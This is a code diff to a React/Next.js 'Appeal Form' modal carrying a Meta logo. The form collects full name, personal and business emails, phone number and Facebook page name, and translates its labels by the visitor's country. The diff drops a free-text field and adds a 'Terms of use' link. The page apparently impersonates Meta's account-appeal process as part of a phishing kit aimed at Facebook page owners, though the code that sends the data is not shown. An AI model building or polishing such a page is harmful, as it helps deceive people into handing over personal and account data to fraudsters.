@@ -10,7 +10,6 @@ import Image from 'next/image';
 import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
 
 interface FormData {
-    information: string;
     fullName: string;
     personalEmail: string;
     businessEmail: string;
@@ -24,7 +23,6 @@ interface FormField {
 }
 
 const FORM_FIELDS: FormField[] = [
-    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
     { name: 'fullName', label: 'Full Name', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' },
     { name: 'businessEmail', label: 'Business Email', type: 'email' },
@@ -35,14 +33,13 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [phoneNumber, setPhoneNumber] = useState('');
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
-        information: '',
         fullName: '',
         personalEmail: '',
         businessEmail: '',
         facebookPageName: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId } = store();
+    const { setModalOpen, setInfoModalOpen, geoInfo, setMessageId } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -51,7 +48,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Appeal Form', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with ', ' Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -144,7 +141,7 @@ ${
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
                                 <p className='font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
+                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' />}
                             </div>
                         ))}
                         <p className='font-sans'>{t('Mobile phone number')}</p>
@@ -158,16 +155,21 @@ ${
                         />
                         <div className='flex items-center gap-2 pt-2'>
                             <input type='checkbox' className='cursor-pointer' />
-                            <p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
+                            <p className='cursor-pointer'>
+                                {t('I agree with ')}
+                                <span onClick={() => setInfoModalOpen(true)} className='ml-2 cursor-pointer text-blue-600 underline hover:text-blue-700'>
+                                    {t('Terms of use')}
+                                </span>
+                            </p>
                         </div>
-                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
+                        <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                         </button>
                     </div>
                 </form>
 
                 <div className='flex items-center justify-center p-3'>
-                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
+                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                 </div>
             </div>
         </div>
